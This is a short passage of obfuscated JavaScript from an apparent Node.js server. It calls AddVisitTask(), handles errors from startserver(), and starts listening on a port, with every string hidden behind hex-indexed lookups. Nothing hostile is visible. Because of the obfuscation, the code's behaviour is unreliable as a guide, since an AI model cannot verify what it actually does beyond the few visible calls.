AddVisitTask();}catch(_0xcf19b){console[_0x197ae9(0x199)](_0x197ae9(0x1af),_0xcf19b);}}startserver()[_0x3b3934(0x180)](_0x3d35d0=>{const _0x4d5d53=_0x3b3934;console['error'](_0x4d5d53(0x16a),_0x3d35d0);}),app[_0x3b3934(0x1a1)](PORT,()=>console[_0x3b3934(0x18f)](_0x3b3934(0x1ba)+PORT+'!'));
